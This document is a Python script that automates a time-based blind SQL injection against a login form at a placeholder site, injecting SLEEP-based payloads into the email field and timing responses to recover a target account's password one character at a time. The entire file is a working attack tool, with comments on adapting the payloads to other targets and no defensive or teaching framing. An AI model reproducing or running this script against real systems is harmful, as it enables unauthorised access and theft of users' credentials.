import re
import mechanize
import time
import string
import numpy as np
#PASSWORD = "iknowthebegginingofthepassword" #take back progress from known password
PASSWORD = "" #what we are looking for
charset = string.printable #characters to test
charset = charset.replace(' ','')
br = mechanize.Browser()
site = "http://vulnerable-site.com/connect.php"
br.open(site)

#SQL Injection Strings
#you will need to change them depending of what you are trying to bruteforce
_true = "' OR (IF (SUBSTRING(Email,-23,23)=\"target@account.fr\", SLEEP(5),0)) AND 'X' = 'X"
_false = "a"

def forge_request(character): #make string to test if character is the next of the password
    InjectionString = "' OR (IF (SUBSTRING(Email,-23,23)=\"target@account.fr\" AND SUBSTRING(PSW,1," + str(len(PASSWORD)+1) + ")=\"" + PASSWORD + character + "\", SLEEP(1),0)) AND 'X' = 'X"
    return InjectionString

def submit_form(InjectionString):
    t0 = time.time()
    try:
        br.open(site)
        br.select_form(nr=0)
        #we suppose a vulnerable login form, whith the injection string bypassing the password field
        #you might need to edit this section depending of the target application
        br["EMAIL"] = InjectionString
        br["PSW"]= "anything"
        response = br.submit()
    except:
        print("tried an invalid character (OR UNKNOWN SERVER ERROR)...") #error is processed fast by the server, no nead to treat it as it will be ignored anyway (in test case scenario)
        #you might need to handle the error properly
    return (time.time() - t0)

#baseline
_true_delays = []
_false_delays = []
for i in range(3):
    _true_delays.append(submit_form(_true))
    _false_delays.append(submit_form(_false))
avg_true = np.average(_true_delays)
avg_false = np.average(_false_delays)

print("baseline values are " + str(avg_true) + " for correct answer and "+ str(avg_false) + " overwise (+-0.5)")
print("starting bruteforce job...")
found = False
while(not(found)):
    for c in charset:
        InjectionString = forge_request(c)
        if (submit_form(InjectionString)>avg_true-0.5):
            PASSWORD += c
            print("new character found: " + PASSWORD + "...lets keep going boy")
            break
        elif c == charset[-1]: #if no character match then the pass is cracked
            found = True

print("PASSWORD IS " + PASSWORD + "|END - this is not part of the password|")
